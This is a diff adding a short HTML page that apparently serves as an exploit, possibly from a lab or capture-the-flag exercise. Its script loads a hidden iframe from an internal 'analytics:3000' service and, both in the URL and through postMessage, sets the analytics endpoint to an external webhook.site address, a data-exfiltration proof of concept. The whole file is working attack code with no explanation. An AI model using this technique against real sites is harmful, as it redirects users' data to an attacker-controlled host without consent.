@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = 'http://analytics:3000/integrate?analyticsDomain=https://webhook.site/b22ebaff-732d-4d68-93b6-262d0d45a847';
+      document.body.appendChild(iframe);
+
+      iframe.onload = () => {
+        iframe.contentWindow.postMessage({
+          analytics: true,
+          url: 'https://webhook.site/b22ebaff-732d-4d68-93b6-262d0d45a847'
+        }, 'http://analytics:3000');
+      };
+    </script>
+  </body>
+</html>
